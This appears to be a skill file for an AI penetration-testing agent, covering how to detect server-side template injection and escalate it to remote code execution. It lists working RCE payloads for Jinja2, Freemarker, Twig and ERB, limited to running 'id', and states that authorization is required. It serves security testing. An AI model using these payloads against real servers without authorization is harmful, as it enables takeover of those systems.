---
name: ssti
description: >-
  Exploit Server-Side Template Injection (CWE-1336/CWE-94): input evaluated by a server
  template engine, escalating from expression evaluation to RCE. Invoke when arithmetic in
  template syntax evaluates (`{{7*7}}`→49, `${7*7}`, `<%=7*7%>`). Engine detection (Jinja2/
  Twig/Freemarker/Velocity/ERB/Handlebars) and its RCE gadget are chosen INSIDE this skill.
family: 04-injection
type: exploit
owasp: [A03:2021]
cwe: [CWE-1336, CWE-94]
requires: []
authorization: required
---

# Server-Side Template Injection

## Invoke when
- A template metacharacter payload is evaluated server-side (`{{7*7}}`→`49`, `${7*7}`→`49`).

## Prerequisites & oracle
- Oracle = arithmetic/string ops in template syntax are computed, not echoed literally.

## Methodology
1. Confirm evaluation with polyglot `${{<%[%'"}}%\`; vary arithmetic to rule out coincidence.
2. Fingerprint engine via distinguishing payloads (table below).
3. Walk the engine's object graph to a code-exec gadget; keep PoC to `id`/marker output.

## Starter payloads (engine table inline)
- Detect: `{{7*7}}` (Jinja2/Twig=49), `${7*7}` (Freemarker/Velocity), `<%= 7*7 %>` (ERB), `#{7*7}`.
- Jinja2 RCE: `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
- Freemarker: `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`
- Twig: `{{['id']|filter('system')}}` / `{{_self.env.registerUndefinedFilterCallback('system')}}`
- ERB: `<%= \`id\` %>`

## False-positive filters
- Reflection of `{{7*7}}` verbatim = no SSTI (maybe XSS → route to `xss-context-triage`).
- `49` could be user-supplied elsewhere — confirm with a fresh non-trivial expression.
